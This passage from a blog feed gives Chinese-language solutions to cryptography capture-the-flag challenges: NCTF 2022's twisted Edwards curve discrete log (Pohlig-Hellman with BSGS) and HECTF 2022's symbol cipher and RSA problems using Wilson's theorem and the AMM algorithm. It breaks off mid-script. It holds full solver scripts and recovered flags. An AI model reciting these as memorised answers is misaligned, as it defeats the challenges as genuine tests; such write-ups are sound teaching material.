keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#nctf&#123;Th1s_N_May_n0t_s0@o0@@_secur3&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="superecc"><a href="#superecc" class="headerlink" title="superecc"></a>superecc</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secrets <span class="token keyword">import</span> INF<span class="token punctuation">,</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">b'nctf&#123;'</span><span class="token keyword">class</span> <span class="token class-name">super_ecc</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span>        self<span class="token punctuation">.</span>d <span class="token operator">=</span> <span class="token number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span>        self<span class="token punctuation">.</span>p <span class="token operator">=</span> <span class="token number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> P<span class="token punctuation">,</span> Q<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span> <span class="token operator">=</span> P        <span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> Q        x3 <span class="token operator">=</span> <span class="token punctuation">(</span>x1 <span class="token operator">*</span> y2 <span class="token operator">+</span> y1 <span class="token operator">*</span> x2<span class="token punctuation">)</span> <span class="token operator">*</span> inverse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>c <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>d <span class="token operator">*</span> x1 <span class="token operator">*</span> x2 <span class="token operator">*</span> y1 <span class="token operator">*</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p        y3 <span class="token operator">=</span> <span class="token punctuation">(</span>y1 <span class="token operator">*</span> y2 <span class="token operator">-</span> self<span class="token punctuation">.</span>a <span class="token operator">*</span> x1 <span class="token operator">*</span> x2<span class="token punctuation">)</span> <span class="token operator">*</span> inverse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>c <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> self<span class="token punctuation">.</span>d <span class="token operator">*</span> x1 <span class="token operator">*</span> x2 <span class="token operator">*</span> y1 <span class="token operator">*</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p        <span class="token keyword">return</span> <span class="token punctuation">(</span>x3<span class="token punctuation">,</span> y3<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> P<span class="token punctuation">)</span><span class="token punctuation">:</span>        Q <span class="token operator">=</span> INF        x <span class="token operator">=</span> x <span class="token operator">%</span> self<span class="token punctuation">.</span>p        <span class="token keyword">while</span> x <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                Q <span class="token operator">=</span> self<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Q<span class="token punctuation">,</span> P<span class="token punctuation">)</span>            P <span class="token operator">=</span> self<span class="token punctuation">.</span>add<span class="token punctuation">(</span>P<span class="token punctuation">,</span> P<span class="token punctuation">)</span>            x <span class="token operator">=</span> x <span class="token operator">>></span> <span class="token number">1</span>        <span class="token keyword">return</span> Qflag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ecc <span class="token operator">=</span> super_ecc<span class="token punctuation">(</span><span class="token punctuation">)</span>G <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span><span class="token punctuation">,</span>     <span class="token number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span><span class="token punctuation">)</span>S <span class="token operator">=</span> ecc<span class="token punctuation">.</span>mul<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> G<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>S<span class="token punctuation">)</span><span class="token comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span><span class="token comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>考查的是Twisted Edward Curve</p><p>题⽬定义了⼀个循环群上的点加法，搜索可以发现是Twisted Edward Curve</p><p><img src="/2023/03/14/2022NCTF/WAGZ2AYAFU.png" alt="img"></p><p>经过适当的变化可以将c消除掉，得到标准形式</p><p><img src="/2023/03/14/2022NCTF/SIGZ2AYAXQ.png" alt="img"></p><p>对于Twisted Edward Curve，可以转化为等价的Montgomery Curve</p><p><img src="/2023/03/14/2022NCTF/UMGZ2AYB44.png" alt="img"></p><p>Montgomery Curve的形式已经是Weierstrass形式的椭圆曲线，可以使⽤sage求解其阶，即求得了Twisted Edward Curve的阶寻找阶中的⼩素数因⼦，使⽤Pohlig Hellman + BSGS求解离散对数问题，得到flag的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env sage</span><span class="token keyword">class</span> <span class="token class-name">super_ecc</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span>        self<span class="token punctuation">.</span>c <span class="token operator">=</span> <span class="token number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span>        self<span class="token punctuation">.</span>d <span class="token operator">=</span> <span class="token number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span>        self<span class="token punctuation">.</span>p <span class="token operator">=</span> <span class="token number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span>        self<span class="token punctuation">.</span>INF <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>c<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> P<span class="token punctuation">,</span> Q<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span> <span class="token operator">=</span> P        <span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> Q        x3 <span class="token operator">=</span> <span class="token punctuation">(</span>x1 <span class="token operator">*</span> y2 <span class="token operator">+</span> y1 <span class="token operator">*</span> x2<span class="token punctuation">)</span> <span class="token operator">*</span> inverse_mod<span class="token punctuation">(</span>self<span class="token punctuation">.</span>c <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>d <span class="token operator">*</span> x1 <span class="token operator">*</span> x2 <span class="token operator">*</span> y1 <span class="token operator">*</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p        y3 <span class="token operator">=</span> <span class="token punctuation">(</span>y1 <span class="token operator">*</span> y2 <span class="token operator">-</span> self<span class="token punctuation">.</span>a <span class="token operator">*</span> x1 <span class="token operator">*</span> x2<span class="token punctuation">)</span> <span class="token operator">*</span> inverse_mod<span class="token punctuation">(</span>self<span class="token punctuation">.</span>c <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">-</span> self<span class="token punctuation">.</span>d <span class="token operator">*</span> x1 <span class="token operator">*</span> x2 <span class="token operator">*</span> y1 <span class="token operator">*</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p        <span class="token keyword">return</span> <span class="token punctuation">(</span>x3<span class="token punctuation">,</span> y3<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> P<span class="token punctuation">)</span><span class="token punctuation">:</span>        Q <span class="token operator">=</span> self<span class="token punctuation">.</span>INF        x <span class="token operator">=</span> x <span class="token operator">%</span> self<span class="token punctuation">.</span>p        <span class="token keyword">while</span> x <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                Q <span class="token operator">=</span> self<span class="token punctuation">.</span>add<span class="token punctuation">(</span>Q<span class="token punctuation">,</span> P<span class="token punctuation">)</span>            P <span class="token operator">=</span> self<span class="token punctuation">.</span>add<span class="token punctuation">(</span>P<span class="token punctuation">,</span> P<span class="token punctuation">)</span>            x <span class="token operator">=</span> x <span class="token operator">>></span> <span class="token number">1</span>        <span class="token keyword">return</span> Q<span class="token keyword">def</span> <span class="token function">get_order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> d <span class="token operator">*</span> c<span class="token operator">^</span><span class="token number">4</span> <span class="token operator">%</span> p    A <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> d<span class="token punctuation">)</span> <span class="token operator">*</span> inverse_mod<span class="token punctuation">(</span>a <span class="token operator">-</span> d<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> p    B <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> inverse_mod<span class="token punctuation">(</span>a <span class="token operator">-</span> d<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> p    a1 <span class="token operator">=</span> <span class="token number">0</span>    a3 <span class="token operator">=</span> <span class="token number">0</span>    a2 <span class="token operator">=</span> A<span class="token operator">*</span>B<span class="token operator">%</span>p    a4 <span class="token operator">=</span> B<span class="token operator">*</span>B<span class="token operator">%</span>p    a6 <span class="token operator">=</span> <span class="token number">0</span>    E<span class="token operator">=</span>EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">,</span>a3<span class="token punctuation">,</span>a4<span class="token punctuation">,</span>a6<span class="token punctuation">]</span><span class="token punctuation">)</span>    np<span class="token operator">=</span>E<span class="token punctuation">.</span>cardinality<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>np<span class="token punctuation">)</span>ecc <span class="token operator">=</span> super_ecc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">def</span> <span class="token function">Pohlig_Hellman</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> R<span class="token punctuation">,</span> sub_order<span class="token punctuation">,</span> order<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span> Q<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ecc<span class="token punctuation">.</span>add<span class="token punctuation">(</span>P<span class="token punctuation">,</span> Q<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ecc<span class="token punctuation">.</span>mul<span class="token punctuation">(</span>x <span class="token operator">%</span> order<span class="token punctuation">,</span> P<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">BSGS</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> R<span class="token punctuation">,</span> sub<span class="token punctuation">)</span><span class="token punctuation">:</span>        L<span class="token punctuation">,</span> R <span class="token operator">=</span> mul<span class="token punctuation">(</span>L<span class="token punctuation">,</span> <span class="token punctuation">(</span>order<span class="token operator">//</span>sub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mul<span class="token punctuation">(</span>R<span class="token punctuation">,</span> <span class="token punctuation">(</span>order<span class="token operator">//</span>sub<span class="token punctuation">)</span><span class="token punctuation">)</span>        m<span class="token punctuation">,</span> dic <span class="token operator">=</span> sqrt<span class="token punctuation">(</span>sub<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        ga <span class="token operator">=</span> mul<span class="token punctuation">(</span>L<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>ga<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ga <span class="token operator">=</span> i<span class="token punctuation">,</span> add<span class="token punctuation">(</span>ga<span class="token punctuation">,</span> L<span class="token punctuation">)</span>        gb <span class="token operator">=</span> mul<span class="token punctuation">(</span>L<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>sub<span class="token operator">//</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>R<span class="token punctuation">)</span> <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                sk <span class="token operator">=</span> i<span class="token operator">*</span>m <span class="token operator">+</span> dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>R<span class="token punctuation">)</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sub<span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sk<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>sk<span class="token punctuation">)</span>            R <span class="token operator">=</span> add<span class="token punctuation">(</span>R<span class="token punctuation">,</span> gb<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    sk <span class="token operator">=</span> crt<span class="token punctuation">(</span>        <span class="token punctuation">[</span>BSGS<span class="token punctuation">(</span>L<span class="token punctuation">,</span> R<span class="token punctuation">,</span> sub<span class="token punctuation">)</span> <span class="token keyword">for</span> sub <span class="token keyword">in</span> sub_order<span class="token punctuation">]</span><span class="token punctuation">,</span>        sub_order    <span class="token punctuation">)</span>    <span class="token keyword">return</span> sk<span class="token comment"># order = get_order()</span>order <span class="token operator">=</span> <span class="token number">101194790049284589034264952247851014979635478581961323247248565451562534055248</span>sub_order <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">28921</span><span class="token punctuation">,</span> <span class="token number">749971</span><span class="token punctuation">,</span> <span class="token number">87374629</span><span class="token punctuation">]</span>G <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span><span class="token punctuation">,</span>     <span class="token number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span><span class="token punctuation">)</span>S <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span><span class="token punctuation">,</span>     <span class="token number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span><span class="token punctuation">)</span>sk <span class="token operator">=</span> Pohlig_Hellman<span class="token punctuation">(</span>G<span class="token punctuation">,</span> S<span class="token punctuation">,</span> sub_order<span class="token punctuation">,</span> order<span class="token punctuation">)</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>sk<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HECTF</title>
      <link href="/2023/03/14/HECTF/"/>
      <url>/2023/03/14/HECTF/</url>
      
        <content type="html"><![CDATA[<h1 id="HECTF-2022"><a href="#HECTF-2022" class="headerlink" title="HECTF 2022"></a>HECTF 2022</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-none"><code class="language-none">♭♭♫♭♭§‖♭∮♭♯♩‖♭♪‖♩♫‖♭‖♭‖§♭‖♩‖♬♫♭‖‖‖♬∮‖¶♩♭‖♪‖♬♯♭♯♪‖¶¶‖♬♭♭‖♪‖♬♫§&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>先进行音符解密</p><p>然后利用变异凯撒</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token string">'EA>N?s:WZgTdPYbMSaYg'</span>flag<span class="token operator">=</span><span class="token string">''</span>k<span class="token operator">=</span><span class="token number">3</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>k<span class="token punctuation">)</span>    k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#HECTF&#123;Caesar_is_fun&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympy<span class="token keyword">import</span> random<span class="token keyword">import</span> math<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span> hint<span class="token punctuation">,</span> e1<span class="token keyword">def</span> <span class="token function">mygenerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    g <span class="token operator">=</span> p<span class="token operator">-</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span>    q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>math<span class="token punctuation">.</span>gamma<span class="token punctuation">(</span>g<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> p<span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> g<span class="token punctuation">,</span> qp<span class="token punctuation">,</span> g<span class="token punctuation">,</span> q <span class="token operator">=</span> mygenerate<span class="token punctuation">(</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qe2 <span class="token operator">=</span> <span class="token number">65537</span>m1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>m2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>hint<span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> p<span class="token punctuation">)</span>c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p ='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'g ='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c1 ='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c2 ='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>第一步分先利用威尔逊定理求</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> sympye2 <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span>g <span class="token operator">=</span> <span class="token number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span>c1 <span class="token operator">=</span> <span class="token number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span>c2 <span class="token operator">=</span> <span class="token number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span><span class="token keyword">def</span> <span class="token function">mydecrypt</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span>B<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans<span class="token operator">=</span><span class="token number">1</span>    temp<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span>    <span class="token comment">#print(temp)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>B<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>A<span class="token punctuation">)</span><span class="token punctuation">:</span>        ans<span class="token operator">=</span><span class="token punctuation">(</span>ans<span class="token operator">*</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>i<span class="token punctuation">,</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>A    <span class="token keyword">return</span> <span class="token punctuation">(</span>ans<span class="token operator">*</span>temp<span class="token punctuation">)</span><span class="token operator">%</span>Aq <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>mydecrypt<span class="token punctuation">(</span>p<span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phi2<span class="token punctuation">)</span>m2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'Here, e1=2, think about whether you can still use rsa to solve problems'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是e和phi_n不互素，用普通方法求不出来，所以利用AMM算法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token comment"># About 3 seconds to run</span><span class="token keyword">def</span> <span class="token function">AMM</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> r<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>    start <span class="token 